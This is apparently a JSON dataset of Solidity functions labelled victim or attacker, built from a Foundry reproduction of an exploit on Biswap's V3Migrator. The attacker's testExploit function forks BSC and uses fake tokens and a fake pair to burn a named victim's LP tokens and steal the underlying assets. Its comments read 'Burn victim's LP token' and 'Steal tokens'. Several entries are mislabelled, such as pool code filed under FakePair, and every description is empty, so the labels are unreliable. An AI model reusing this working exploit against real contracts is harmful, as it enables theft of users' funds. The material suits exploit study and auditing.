[
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "decreaseAllowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "increaseAllowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        // fork bsc\n        uint256 forkId = vm.createFork(\"bsc\", 29_554_461);\n        vm.selectFork(forkId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        V3Migrator migrator = V3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);\n        IUniswapV2Pair pairToMigrate = IUniswapV2Pair(0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85);\n        address victimAddress = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;\n\n        IBiswapFactoryV3 biswapV3 = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);\n        //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator\n        FakeToken fakeToken0 = new FakeToken();\n        FakeToken fakeToken1 = new FakeToken();\n        FakePair fakePair = new FakePair();\n        biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);\n        fakeToken0.transfer(address(migrator), 1e9 * 1e18);\n        fakeToken1.transfer(address(migrator), 1e9 * 1e18);\n\n        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);\n        emit log_named_uint(\"liquidity to migrate\", liquidityValue);\n        IERC20 token0 = IERC20(pairToMigrate.token0());\n        IERC20 token1 = IERC20(pairToMigrate.token1());\n        assert(token0.balanceOf(address(this)) == 0);\n\n        //1. Burn victim's LP token and add liquidity with fake tokens\n        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(\n            address(pairToMigrate),\n            liquidityValue,\n            address(fakeToken1),\n            address(fakeToken0),\n            150,\n            10_000,\n            20_000,\n            0,\n            0,\n            victimAddress,\n            block.timestamp + 1 minutes,\n            false\n        );\n        migrator.migrate(params);\n\n        uint256 token0Balance = token0.balanceOf(address(migrator));\n        uint256 token1Balance = token1.balanceOf(address(migrator));\n        fakePair.update(token0Balance, token1Balance);\n        emit log_named_decimal_uint(\"this token0 before\", token0.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"this token1 before\", token1.balanceOf(address(this)), 18);\n\n        //2. Steal tokens\n        fakePair.transfer(address(this), 1e9 * 1e18);\n        fakePair.approve(address(migrator), 1e9 * 1e18);\n        V3Migrator.MigrateParams memory params2 = V3Migrator.MigrateParams(\n            address(fakePair),\n            liquidityValue,\n            address(token0),\n            address(token1),\n            800,\n            10_000,\n            20_000,\n            0,\n            0,\n            address(this),\n            block.timestamp + 1 minutes,\n            false\n        );\n        migrator.migrate(params2);\n\n        assert(token0.balanceOf(address(this)) > 1e18);\n        emit log_named_decimal_uint(\"this token0 after\", token0.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"this token1 after\", token1.balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "FakePair",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(\n        int24 leftPt,\n        int24 rightPt,\n        uint128 liquidDelta\n    ) external override noDelegateCall lock returns (uint256 amountX, uint256 amountY) {\n        (bool success, bytes memory d) = liquidityModule.delegatecall(\n            abi.encodeWithSelector(0xa34123a7, leftPt, rightPt, liquidDelta)//\"burn(int24,int24,uint128)\"\n        );\n        if (success) {\n            (amountX, amountY) = abi.decode(d, (uint256, uint256));\n            emit Burn(msg.sender, leftPt, rightPt, liquidDelta, amountX, amountY, getStateEvent());\n        } else {\n            revertDCData(d);\n        }\n    }\n\n    /// @inheritdoc IBiswapPoolV3\n",
    "description": ""
  },
  {
    "contract/interface": "FakePair",
    "source_type": "victim_contract",
    "function_name": "update",
    "original_code": "    function update(\n        Liquidity.Data storage self,\n        int128 delta,\n        uint256 feeScaleX_128,\n        uint256 feeScaleY_128,\n        uint16 feeToVote,\n        uint256 fpScale_128\n    ) internal {\n        Data memory data = self;\n        uint128 liquidity;\n        feeToVote = feeToVote == 0 ? data.feeVote : feeToVote;\n        if (delta == 0) {\n            require(data.liquidity > 0, \"L>0\");\n            liquidity = data.liquidity;\n            self.feeVote = feeToVote;\n        } else {\n            liquidity = liquidityAddDelta(data.liquidity, delta);\n            uint256 feeTimesLOld = data.liquidity * data.feeVote;\n            uint256 feeTimesLNew = delta < 0 ?\n                feeTimesLOld - uint128(-delta) * feeToVote :\n                feeTimesLOld + uint128(delta) * feeToVote;\n            self.feeVote = liquidity > 0 ? uint16(feeTimesLNew / liquidity) : data.feeVote;\n        }\n        uint256 deltaScaleX = data.lastFeeScaleX_128;\n        uint256 deltaScaleY = data.lastFeeScaleY_128;\n        uint256 deltaScaleFp = data.lastFPScale_128;\n        // use assembly to prevent revert if overflow\n        // data.lastFeeScaleX(Y)_128 may be \"negative\" (>=2^255)\n        assembly {\n            deltaScaleX := sub(feeScaleX_128, deltaScaleX)\n            deltaScaleY := sub(feeScaleY_128, deltaScaleY)\n            deltaScaleFp := sub(fpScale_128, deltaScaleFp)\n        }\n        uint256 feeX = MulDivMath.mulDivFloor(deltaScaleX, data.liquidity, TwoPower.Pow128);\n        uint256 feeY = MulDivMath.mulDivFloor(deltaScaleY, data.liquidity, TwoPower.Pow128);\n        uint256 fp = MulDivMath.mulDivFloor(deltaScaleFp, data.liquidity, TwoPower.Pow128);\n        //        data.liquidity = liquidity;\n\n        // update the position\n        if (delta != 0) self.liquidity = liquidity;\n        self.lastFeeScaleX_128 = feeScaleX_128;\n        self.lastFeeScaleY_128 = feeScaleY_128;\n        self.lastFPScale_128 = fpScale_128;\n\n        //BAP-06\n        self.fpOwed += fp;\n\n        if (feeX > 0 || feeY > 0) {\n            // need to withdraw before overflow\n            self.tokenOwedX += feeX;\n            self.tokenOwedY += feeY;\n        }\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IBiswapFactoryV3",
    "source_type": "victim_contract",
    "function_name": "newPool",
    "original_code": "    function newPool(\n        address tokenX,\n        address tokenY,\n        uint16 fee,\n        int24 currentPoint\n    ) external override noDelegateCall returns (address addr) {\n        require(tokenX != tokenY, \"SmTK\");\n        if (tokenX > tokenY) {\n            (tokenX, tokenY) = (tokenY, tokenX);\n        }\n        require(pool[tokenX][tokenY][fee] == address(0));\n        int24 pointDelta = fee2pointDelta[fee];\n\n        require(pointDelta > 0, 'pd');\n        // now creating\n        bytes32 salt = keccak256(abi.encode(tokenX, tokenY, fee));\n\n        deployPoolParams = DeployPoolParams({\n            tokenX: tokenX,\n            tokenY: tokenY,\n            fee: fee,\n            currentPoint: currentPoint,\n            pointDelta: pointDelta,\n            feeChargePercent: defaultFeeChargePercent\n        });\n\n        addr = DeployPool.deployPool(salt);\n        delete deployPoolParams;\n\n        pool[tokenX][tokenY][fee] = addr;\n        pool[tokenY][tokenX][fee] = addr;\n        emit NewPool(tokenX, tokenY, fee, uint24(pointDelta), addr);\n    }\n\n    /// @inheritdoc IBiswapFactoryV3\n",
    "description": ""
  },
  {
    "contract/interface": "V3Migrator",
    "source_type": "victim_contract",
    "function_name": "migrate",
    "original_code": "    function migrate(MigrateParams calldata params) external override returns(uint refund0, uint refund1){\n\n        // burn v2 liquidity to this address\n        IBiswapPair(params.pair).transferFrom(params.recipient, params.pair, params.liquidityToMigrate);\n        (uint256 amount0V2, uint256 amount1V2) = IBiswapPair(params.pair).burn(address(this));\n\n        // calculate the amounts to migrate to v3\n        uint128 amount0V2ToMigrate = uint128(amount0V2);\n        uint128 amount1V2ToMigrate = uint128(amount1V2);\n\n        // approve the position manager up to the maximum token amounts\n        safeApprove(params.token0, liquidityManager, amount0V2ToMigrate);\n        safeApprove(params.token1, liquidityManager, amount1V2ToMigrate);\n\n        // mint v3 position\n        (, , uint256 amount0V3, uint256 amount1V3) = ILiquidityManager(liquidityManager).mint(\n            ILiquidityManager.MintParam({\n                miner: params.recipient,\n                tokenX: params.token0,\n                tokenY: params.token1,\n                fee: params.fee,\n                pl: params.tickLower,\n                pr: params.tickUpper,\n                xLim: amount0V2ToMigrate,\n                yLim: amount1V2ToMigrate,\n                amountXMin: params.amount0Min,\n                amountYMin: params.amount1Min,\n                deadline: params.deadline\n            })\n        );\n\n        // if necessary, clear allowance and refund dust\n        if (amount0V3 < amount0V2) {\n            if (amount0V3 < amount0V2ToMigrate) {\n                safeApprove(params.token0, liquidityManager, 0);\n            }\n\n            refund0 = amount0V2 - amount0V3;\n            if (params.refundAsETH && params.token0 == WETH9) {\n                IWETH9(WETH9).withdraw(refund0);\n                safeTransferETH(params.recipient, refund0);\n            } else {\n                safeTransfer(params.token0, params.recipient, refund0);\n            }\n        }\n        if (amount1V3 < amount1V2) {\n            if (amount1V3 < amount1V2ToMigrate) {\n                safeApprove(params.token1, liquidityManager, 0);\n            }\n\n            refund1 = amount1V2 - amount1V3;\n            if (params.refundAsETH && params.token1 == WETH9) {\n                IWETH9(WETH9).withdraw(refund1);\n                safeTransferETH(params.recipient, refund1);\n            } else {\n                safeTransfer(params.token1, params.recipient, refund1);\n            }\n        }\n\n        emit Migrate(\n            params,\n            amount0V2,\n            amount1V2,\n            amount0V3,\n            amount1V3\n        );\n    }\n\n",
    "description": ""
  }
]